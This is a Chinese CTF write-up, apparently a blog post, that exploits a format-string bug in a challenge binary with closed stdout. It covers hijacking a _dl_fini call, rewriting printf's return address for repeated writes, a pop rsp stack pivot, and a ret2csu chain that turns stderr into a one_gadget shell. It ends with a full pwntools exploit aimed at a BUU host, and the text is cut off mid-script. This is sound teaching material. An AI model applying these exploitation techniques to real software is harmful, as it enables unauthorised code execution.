alt=""></p><p>程序很短，这题很简单？</p><p>hh，继续往下看吧。</p><p>程序就四个点，第一是程序自己泄露个栈地址</p><p>第二是close关闭了标准输出，如果不过仅仅是关闭了一个文件描述符，只要能获取shell的话，重定向一下文件描述符就ok了。</p><p>第三是有个格式化字符漏洞的点，同时这道题溢出给的超大（并且是输入到bss段）。</p><p>第四是程序没有return，格式化字符函数利用完之后，程序就exit了。</p><p>首先猜测泄露的栈地址应该是要配合格式化字符函数使用的，close只关闭了一个文件描述符，只要能获取shell的话，这个点也好处理。最困难的点是print后面紧接着就是exit了，因此去用print来修改main函数的返回地址以劫持执行流肯定是行不通的了，至此卡死…</p><h2 id="尝试一下调试">尝试一下调试</h2><h3 id="先patch一下">先patch一下</h3><p>先patch一下libc和ld，这道题是2.23的libc，查看方法如下。</p><p><img src="../img/2706180-20220419222544382-1860213709.png" alt=""></p><p><img src="../img/2706180-20220419222604821-2028299225.png" alt=""></p><p><img src="../img/2706180-20220419222623038-343280554.png" alt=""></p><p>然后下载对应的libc，patch一下即可。（这道题我看了一下发现是2.23的，就直接用glibc-all-in-one里的2.23libc了，结果最后导致小版本不同，本地打通了，远程没通，因此下回直接patch buu上给的libc即可）</p><p><a href="(https://www.cnblogs.com/ZIKH26/articles/16044588.html)">如何patch，我这篇博客有提到</a></p><h3 id="初步调试">初步调试</h3><p>首先明确一下我们想看什么，我们现在什么也不知道，但是打算去看一下栈里的情况碰碰运气**（栈中情况如下）**。不过格式化字符函数之前的栈一律不用看（因为我们利用不了）。</p><p>基本上感觉看不出来什么，如果非要说个不一样的，那就发现有个栈里的内容颜色和其他的不一样。（此时是即将执行格式化字符函数时）</p><p><img src="../img/2706180-20220419222641908-41446843.png" alt=""></p><p>用vmmap看一下，发现这个地址是位于ld.so中的，这个地址有点奇怪，不过依然不知道这里有什么用。</p><p><img src="../img/2706180-20220419222652607-1470036751.png" alt=""></p><p>不过根据经验来看，似乎是要劫持exit里的某个hook？因为之前也遇见过一道类似这种手法的题目。</p><p>si进入exit里面看看。</p><p>经过漫长的si之后，终于在dl_fini+250处执行之后，此时的栈里，居然出现了刚才的那个奇怪地址**（栈中情况如下）**</p><p><img src="../img/2706180-20220419222710108-373516738.png" alt=""></p><p>继续又si了很久，发现此时call了一下，我们溯源一下r12寄存器的值（rdx就不用管了，因为本身自己就为0了）。</p><p><img src="../img/2706180-20220419221014598-2091139831.png" alt="image-20220419094811717"></p><p>往上翻了几步发现，r12的值是自身的值加上了rbx所指向的内容。(我们可以控制rbx所指向的内容，但是控制不了原本的r12)</p><p><img src="../img/2706180-20220419221013949-678030322.png" alt="image-20220419095011665"></p><h3 id="解决exit的退出问题">解决exit的退出问题</h3><h4 id="重新梳理一下当前信息：">重新梳理一下当前信息：</h4><p>1、栈里有个位于ld.so中的地址，我们可以利用格式化字符串漏洞修改这个地址所指向的值（但是修改不了这个位于ld.so地址）。<strong>（因为格式化字符串漏洞想要修改某个值，就必须去找到指向这个值的地址利用相对栈顶偏移完成修改）</strong>。</p><p>2、程序最后调用了<code>exit</code>中的<code>__run_exit_handlers</code>函数中的<code>_dl_fini</code>中的一个call ptr[r12+rdx*8]   而r12就是那个**位于ld.so中的地址所指向的值(不修改的话，默认为0)**加了0x600dd8。</p><h4 id="我们当下的目的是什么？">我们当下的目的是什么？</h4><p>劫持程序执行流，不让其触发exit导致程序结束，并且让执行流去重新执行read以及printf（不能返回到main函数，不然会重新初始化栈空间），因为程序的漏洞点只有这一个，因此只能劫持到这里。</p><h4 id="怎么做？">怎么做？</h4><p>由于call后面加了个ptr，因此r12最后的值应该让它去指向这里<br><img src="../img/2706180-20220419222836279-1337151327.png" alt=""></p><p>采用策略是将0x4007A3布置到bss段，然后让r12的值为指向0x4007A3的地址(也就是bss段地址)。</p><h4 id="对应payload">对应payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)<span class="comment">#这个地址要放在最后，如果放在payload最开始</span></span><br><span class="line"><span class="comment">#p64打包产生的00会将格式化字符函数截断，导致后面布置的格式化字符无法被解析</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>关于payload解释如下</p><p><img src="../img/2706180-20220419222849072-1784896764.png" alt=""></p><p>此处距离栈顶偏移20，再加上6个寄存器，偏移为26。</p><p>payload从0x601060开始输入，把格式化字符部分填充为16个字节，因此0x601070装的是0x4007A3。<strong>在__dl__fini中执行add的时候r12原本的值为0x600dd8</strong>。因此需要将rbx所指向的值修改为0x298(0x601070-0x600dd8) ，这样才能让最后call的时候r12为0x601070。</p><h3 id="如何多次任意写？">如何多次任意写？</h3><p>现在确实是又返回到了read函数，我们的思路应该是写个rop链在bss段，然后想办法让执行流迁移过去。具体细节先不想那么多，但是一次printf肯定是不行的，那怎么办？光想的话，我也不知道怎么办…    那就继续调试，看看此时栈里有没有可用利用的地方</p><p><img src="../img/2706180-20220419222914265-1836923816.png" alt=""></p><p>可以发现栈里此时多了很多指向栈本身的指针，最值得关注的是红框的那个地方。这个栈地址是指向当前栈顶的上一个内存单元，这意味着如果执行printf的话，那printf的返回地址将被存放到这个内存单元（如下图）</p><p><img src="../img/2706180-20220419222930128-970393783.png" alt=""></p><p>此时的这个0x4007c6就是printf的返回地址了。</p><p>所以我们就可以… <strong>用printf修改printf的返回地址以便让执行流继续执printf</strong>！！</p><p>（这个想法听起来有点小疯狂，但是确实可以实现，<strong>这样做的前提是栈中必须存放着一个栈地址，并且这个栈地址指向了当前函数的返回地址</strong>）</p><h4 id="半成品payload">半成品payload</h4><p>所以这里的半成品payload是这样的（0xa3是read的地址的末字节，偏移23就不再数了）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>之所以是半成品，是因为执行了这个之后我们仅仅只是返回到了printf，但事实上我们需要再干点别的事情（因为单纯的无限执行printf是没有意义的）</p><h2 id="题目整体大致思路：">题目整体大致思路：</h2><p>此时再捋一下获取shell的思路。</p><p>1、你想尝试泄露函数地址，去libc里搜system？   close(1)直接打消了这条路 （因为执行打印函数是无法泄露出来内容的）</p><p>2、在不知道libc基址的情况下，目前我能想到的方法只有去利用magic_gadget来修改一个got表了。</p><p>3、想利用magic_gadget就肯定是需要专门控制寄存器，采用的手法肯定要是ret2csu。但是想利用ret2csu中的pop去控制各个寄存器，就意味着我们能够控制栈中的数据，可事实上我们输入的内容全都跑到bss段了。（如果利用格式化字符函数把数据全部布置到栈上是不现实的）因此采用的对抗策略是迁移栈到bss段。</p><p>4、这道题迁移栈和以往的栈迁移不一样，以往的栈迁移是可控的栈地址很少，因此装个leave；ret，但事实上这道题我们压根就无法输入内容到栈上。考虑下栈迁移的本质是什么？ 控制rsp寄存器。搜一下gadget看看？</p><p><img src="../img/2706180-20220419221012046-905721054.png" alt="image-20220419121807276"></p><p>发现是存在pop rsp的。</p><p>5、至此思路已经很清晰了，用pop rsp来改变栈到bss段，然后布置rop链到bss段。不过在此之前我们需要将pop rsp布置到bss地址的上面紧挨着的内存单元(因为pop弹的就是下一个内存单元的值给rsp)。</p><p>而pop rsp最终怎么被执行？只能是将print的返回地址改成pop rsp的地址</p><blockquote><p><strong>最终得出结论：</strong> 我们要一边劫持printf进行多次格式化字符串漏洞的利用，一边要去将print返回地址下面的内存单元改成bss地址，改写完成后，最后一次payload去将print的返回地址改写成pop rsp地址，并且将rop链发送到bss段上。</p></blockquote><p>接下来的内容分为两部分，第一部分是如何一点一点在栈上写入bss段地址，第二部分为rop链的构造。</p><h2 id="栈链的布置">栈链的布置</h2><p>首先明确两件事情，我们修改地址无法用$n一次性将整个内容全部写入(因为字符数量太多将导致传输异常）因此我们最多只能一次写两字节($hn)或是一次写一字节($hhn)。</p><p>第二件事，就是使用格式化字符串任意写的时候，是利用相对栈顶偏移写入数据，难道是将数据写到相对栈顶偏移的这个地方？不不不，<strong>其实是将数据写到了相对于栈顶偏移这个地方所指向的地方。</strong></p><p>以<code>%100c%9$hn</code>为例。它的意思是<strong>说将100写入距离栈顶偏移为9所指向的位置</strong>（如下图）。</p><p><img src="../img/2706180-20220419222956380-1871716338.png" alt=""><br><img src="../img/2706180-20220419223019980-1819334104.png" alt=""></p><p>这两张图片应该能说明的很充分了吧，<strong>就是栈中数据必须是个地址，才能通过它修改它指向的那个位置</strong>。（0x112233变成0x112264是因为100的十六进制是64）</p><blockquote><p>此时我们想在一个大小为八字节的内存单元中用一次写入两字节的方法凭空写一个bss段地址，需要怎么做？</p><p>现在将进入烧脑时刻，我们暂时先抛开这道题，去想一下这个问题</p></blockquote><p>我们似乎要去找一个栈地址a，这个栈地址a指向的内容也要是个栈地址b，然后我们就可以去往栈地址b所指向的那个内存单元里写入一个bss段地址了，就跟上面那两张图片一样？</p><p>但是似乎出现了点问题，因为我们只能一次写入两字节，而要写入bss段地址的同时还要将这个内存单元中没有用的部分将其设置为0。如果再按照上面两个图片的方法去写入，我们永远只能去修改那一个字节的部分。</p><p>因此产生的策略是，我们用三个指针来完成写入bss地址这件事。直接上图片</p><p><img src="../img/2706180-20220419223038254-1190819708.png" alt=""></p><p>现在假设a,b,c全部都为栈地址，而d的值为0xffffffffffffffff，我们最终的目的是将d修改为0x601060。</p><blockquote><p>我们先看最后一行的三个指针，如果现在有个格式化字符串漏洞的话，我们是可以拿到b距离栈顶偏移，然后通过b去修改c的值。然后还可以看第二行，拿到c相对栈顶偏移，通过c去修改d的值。而我们每次只能写入两个字节，也就是说第一次只能通过c来将d修改为0xffffffffffff1060。然后我们再去第三行，通过b来修改c的值，把c改成c+2，接着再回到第二行，通过c来修改d的值，这次我们将d可以改成0xffffffff00601060。依次类推（把前面的ff全部改成0），我们靠移动c指针的位置，来改变我们写入d的位置，尽管一次是写入两个字节，但是最终依旧可以达到在一个内存单元中写出一个完整的地址。</p></blockquote><p>如果没理解的话，先确保自己是否真的明白如何利用格式化字符漏洞完成写的操作，如果是真的明白这件事，就反复去想一下上面的过程。</p><p>ok,我现在假设你已经懂了上面的过程，那接下来的过程对你来说就是小儿科了。</p><p>思路重新回到这个题目来，看一下执行完第一个payload之后，栈里的情况（如下图）</p><p><img src="../img/2706180-20220419221011687-970875891.png" alt="image-20220419144015357"></p><p>现在我们要做的就是在栈里写一个bss段地址（本题写的bss段地址是0x601088，这个地址刚开始是不知道的，我们可以先随便写个地址，最后通过调试去把这个正确的地址进行重新修正）</p><p>上图中标注的①，②，③其实就对应我演示的那个图片。还记得上文提到的一个半成品payload么，其实就是④，printf将修改它自己的返回地址。</p><p>下面来展示下payload，以及修改前后的栈（变化前后的地方已用红框标注）（修改原理上面已经介绍过了）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#泄露的栈地址距离返回地址下面的那个内存单元的地址偏移为0x118</span></span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"><span class="comment">#if进行判断是因为，我们并不知道hook_addr和0xa3谁打，因此需要应对这两种情况</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220419221009667-1000319065.png" alt="image-20220419175618585"></p><p>修改后：</p><p><img src="../img/2706180-20220419221008260-139544778.png" alt="image-20220419191555739"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span><span class="comment">#去写入低二字节0x1088</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220419221006281-955412098.png" alt="image-20220419175849476"></p><p>修改后：</p><p><img src="../img/2706180-20220419221004925-759941982.png" alt="image-20220419191955052"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开始移动 指向bss段指针，方便第二次的写入bss段</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#将指向bss段的指针抬高两字节</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220419221003228-2090621249.png" alt="image-20220419180744259"></p><p>修改后：</p><p><img src="../img/2706180-20220419221001000-1387788773.png" alt="image-20220419180954716"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220419220959694-85625257.png" alt="image-20220419182535080"></p><p>修改后：</p><p><img src="../img/2706180-20220419220958563-1794782074.png" alt="image-20220419183311175"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr=hook_addr+<span class="number">0x2</span><span class="comment">#继续将指向bss段的指针抬高两字节</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220419220957599-2028534812.png" alt="image-20220419184908968"></p><p>修改后：</p><p><img src="../img/2706180-20220419220956611-987086324.png" alt="image-20220419185253367"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span>  <span class="comment">#这个的意思是写入两字节的0给栈顶偏移13指向的位置</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span> <span class="comment">#这个等下再说</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220419220955982-2010102532.png" alt="image-20220419204052994"></p><p>修改后：</p><p><img src="../img/2706180-20220419220955263-29560299.png" alt="image-20220419204804195"></p><p>至此我们已经达到想要的效果了，也就是将printf返回地址下面的那个内存单元写成bss段地址。</p><p>接下来我们就不用printf再返回去执行read了，我们去执行pop rsp</p><p><img src="../img/2706180-20220419220952979-1955251566.png" alt="image-20220419205614827"></p><p>只需去改变返回地址的最后两字节即可。(payload如下)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>至此，前面的工作全部完成，已经可以去迁移到我们指定的bss段了。接下来就是rop链的构造，不过在此之前还是需要介绍一下magic gadget</p><h3 id="介绍一下magic-gadget">介绍一下magic_gadget</h3><h4 id="一个新的magic-gadget">一个新的magic_gadget</h4><p>关于magic_gadget详细解释，我写在了这篇博客上  <a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">here</a></p><p><img src="../img/2706180-20220419220954443-867091423.png" alt="image-20220419132940571"></p><p>我以前用的magic gadget是这个 add    DWORD PTR [rbp-0x3d], ebx  但这道题搜对应的机器码搜不到了…  不过官方放出了另一个gadget</p><p>adc    DWORD PTR [rbp+0x48],edx</p><p>这个的效果是和之前那个magic gadget效果一样。我们只需要利用csu片段控制一下寄存器rbp和edx的值，就可以达到修改的目的。<strong>具体方法为 rbp中装入stderr指针（因为它本身就存在于libc库中），edx中放入libc中stderr与one_gadget的偏移。</strong></p><p>为什么要放stderr？因为标准输入和标准输出我们肯定是不能改，然后我本来是想放个没用函数的got地址，然后给修改了。但是我用pwndbg输入got之后没有把got表给展示出来…</p><p><img src="../img/2706180-20220419220954240-1943973195.png" alt="image-20220419140734080"></p><p>那就用这个stderr来当做个跳板吧</p><h4 id="如何寻找这个新的magic-gadget">如何寻找这个新的magic gadget</h4><p>ROPgadget --binary a --opcode 11554889       （直接搜这个gadget的机器码）</p><p><img src="../img/2706180-20220419220954014-45506295.png" alt="image-20220416151801735"></p><p><img src="../img/2706180-20220419220953665-1979006857.png" alt="image-20220416151836813"></p><h2 id="rop链的构造">rop链的构造</h2><p>构造rop链之前，我们要考虑一下我们需要怎么做。</p><p>因为无法泄露libc基址，只能利用magic gadget去将stderr修改为one_gadget地址。控制参数使用csu片段，最后利用里面的call ptr去执行stderr，然后获取shell。</p><p>说写就写，首先我们当时是执行了一个pop rsp，但是后面还pop了三个寄存器</p><p><img src="../img/2706180-20220419220952979-1955251566.png" alt="image-20220419205614827"></p><p>因此迁移过来的时候，先填充三个垃圾数据。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然后装入csu片段的地址,此时我们先控制rdx的值，如果现在控制rbp的话，cmp     rbx, rbp这个检查不好过。因此我们先把rbx和rbp设置成0和1，然后我们此时并不需要执行call ptr r12，因此r12这里放一个空函数（指向term_proc函数的地址，因为call的时候是ptr）暂时的payload如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br></pre></td></tr></table></figure><p>然后开始控制rdx，结合magic gadget来看的话</p><p>adc    DWORD PTR [rbp+0x48],edx</p><p>rdx里面装的是one_gadget和stderr的偏移（edx就是rdx寄存器的低四字节），由于这个偏移为负的，因此需要加上一个0x10000000000000000 (取补码)</p><p><img src="../img/2706180-20220419220952622-1140853152.png" alt="image-20220419212514038"></p><p>接下来就是csu的正常传参，等执行完上面这个片段的时候，会再次执行下面的loc_400826，到pop rbp这里将其修改为stderr的地址-0x48即可（因为magic gadget中给stderr加了0x48），然后ret劫持到magic gadget上，最后再执行一次csu片段，控制r12为stderr地址，回到call ptr的时候，即可去执行one_gadget。</p><p>完整rop链：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line"><span class="comment">#执行adc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="EXP：">EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28387</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--&gt;  &#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#减八因为bss段指针的指针需要抬高一个内存单元，去挨着printf返回地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stderr_got_addr=<span class="number">0x601040</span></span><br><span class="line">read_print_addr=<span class="number">0x4007A3</span></span><br><span class="line">pop_rsp_r13_r14_r15_ret=<span class="number">0x40082d</span></span><br><span class="line">adc_addr=<span class="number">0x4006e8</span></span><br><span class="line">csu_gadget1=<span class="number">0x40082A</span></span><br><span class="line">csu_gadget2=<span class="number">0x400810</span></span><br><span class="line">stderr_offset=<span class="number">0x3C5540</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">offset=one_gadget_offset-stderr_offset</span><br><span class="line">term_hook=<span class="number">0x600e10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop链</span></span><br><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line"><span class="comment">#执行adc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持exit，控制执行流</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改printf返回地址，修改指针指向的内容（也就是bss段地址）</span></span><br><span class="line"><span class="comment">#此时第一次是不用修改指向bss段指针的，不过之后的每次修改bss段地址，都需要提前移动一下指向bss段的指针</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始移动 指向bss段指针，方便第二次的写入bss段</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line">pause()</span><br><span class="line"><span 